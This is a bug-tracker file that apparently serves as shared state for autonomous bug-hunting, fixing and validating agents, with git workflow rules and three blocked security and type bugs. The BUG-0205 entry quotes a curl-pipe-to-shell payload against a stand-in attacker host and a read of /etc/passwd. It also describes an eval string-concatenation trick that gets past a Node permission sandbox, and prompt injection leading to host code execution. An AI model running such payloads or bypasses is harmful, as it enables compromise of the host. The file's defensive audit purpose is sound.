# 🐛 Bug Tracker — Agent Shared State

> **This file is the shared state layer between three autonomous agents.**
> Do NOT manually reorder entries. Agents append and update in-place.

---

## Meta

| Key | Value |
|---|---|
| **Last CI Sentinel Pass** | `2026-03-21T20:22:00Z` (Cycle 76 — BUILD GREEN. Tests: 6 failed / 1437 passed / 2 skipped across 3 failed suites. Known failures: BUG-0312 (2), BUG-0363 (3), BUG-0456 (1). 264 test files ran. 0 new regressions. 0 new bugs filed. 0 escalations filed.) |
| **Last Hunter Scan** | `2026-03-22T00:10:00Z` |
| **Last Fixer Pass** | `2026-03-21T21:42:00Z` (idle — 0 pending, 0 reopened, 0 in-progress) |
| **Last Validator Pass** | `2026-03-21T19:52:00Z` (no fixed/in-validation bugs — 23 blocked) |
| **Last Digest Run** | `2026-03-22T00:06:00Z` |
| **Last Security Scan** | `2026-03-21T16:15:00Z` |
| **Hunter Loop Interval** | `5min` |
| **Fixer Loop Interval** | `2min` |
| **Validator Loop Interval** | `5min` |
| **Last TestGen Run** | `2026-03-22T02:00:00Z` |
| **Last Git Manager Pass** | `2026-03-22T20:55:00Z` (Cycle 335 — 0 deletions, 0 rebases; 0 bugfix branches — repo quiescent, 3 bugs blocked, gc skipped 335%6=5) |
| **Last Supervisor Pass** | `2026-03-21T10:45:28Z` |
| **Total Found** | `436` |
| **Total Pending** | `0` |
| **Total In Progress** | `0` |
| **Total Fixed** | `0` |
| **Total In Validation** | `0` |
| **Total Verified** | `0` |
| **Total Blocked** | `3` |
| **Total Reopened** | `0` |

---

## Status Lifecycle

```
pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
                                                → reopened → (re-enters as pending)
                       → blocked                           ⏸️ (waiting on human)
```

- **pending** — Logged by Hunter, waiting for Fixer.
- **in-progress** — Fixer is actively working on it.
- **fixed** — Fixer believes it is resolved, waiting for Validator.
- **in-validation** — Validator is actively reviewing the fix.
- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
- **blocked** — Fixer cannot resolve without human intervention.

---

## Agent Instructions

### Bug Hunter Agent (Producer)

1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
4. Append new bugs to the `## Bugs` section using the exact template below.
5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
6. Assign the next sequential `BUG-XXXX` ID.
7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.

### Bug Fixer Agent (Consumer)

1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
2. Set `status: in-progress` and fill `fixer_started` before beginning work.
3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.

#### Git Workflow (CRITICAL — follow exactly)

4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
5. **Create or recreate branch:**
   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
14. Increment `reopen_count` if this was a reopened bug.
15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.

#### Guardrails
- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`

16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.

### Bug Validator Agent (Quality Gate)

1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
2. Set `status: in-validation` and fill `validator_started` before beginning review.

#### Pre-flight Checks (before reviewing code)

3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.

#### Code Review

6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).

#### On Validation Success — Merge, Archive, Cleanup

9. **Merge to main:**
   ```
   git checkout main
   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
   ```
10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).

#### On Validation Failure — Reopen

15. If any check fails: `git checkout main` (abandon the branch review).
16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`

#### Final

19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).

---

## Bug Entry Template

```markdown
### BUG-XXXX
- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
- **severity:** `critical` | `high` | `medium` | `low`
- **file:** `path/to/file.ts`
- **line:** `42`
- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
- **description:** Brief description of the bug or gap.
- **context:** Why this is a problem / what could go wrong.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-13T10:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
```

---

## Bugs


### BUG-0205
- **status:** `blocked`
- **severity:** `critical`
- **file:** `packages/tools/src/code-execution/node-eval.ts`
- **line:** `57`
- **category:** `security-injection`
- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** ``
- **hunter_found:** `2026-03-17T03:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
- **validator_started:** `2026-03-18T01:20:50Z`
- **validator_completed:** `2026-03-18T01:30:00Z`
- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`
- **test_generated:** `true`
- **test_file:** `packages/tools/src/__tests__/node-eval-esm-bypass.test.ts`

---

### BUG-0256
- **status:** `blocked`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `11`
- **category:** `security-auth`
- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
- **reopen_count:** `4`
- **branch:** `bugfix/BUG-0256`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 4 failed fix attempts. Requires human review.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:24:00Z`
- **validator_notes:** `REOPENED: Fix summary says "Added export type { A2AServerOptions } from ./server/index.js to barrel" — this is a type re-export and has zero relation to the security-auth vulnerability (unauthenticated RPC access). The server still accepts all requests without auth when apiKey is omitted. No authentication logic was added. reopen_count now 4 — Fixer should auto-block per guardrail.`

---

### BUG-0264
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/lsp/client.ts`
- **line:** `526`
- **category:** `type-error`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0264`
- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:25:00Z`
- **validator_completed:** `2026-03-20T22:25:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. All 3 original failures persist unchanged across 3 fix/validate cycles: (1) no jsonrpc === "2.0" gate, (2) dead typeof id === "undefined" check (never true inside "id" in message guard), (3) no result/error presence validation. Requires human review.`
- **test_generated:** `true`
- **test_file:** `src/__tests__/lsp-client-message-validation.test.ts`

---
<!-- HUNTER: Append new bugs above this line -->
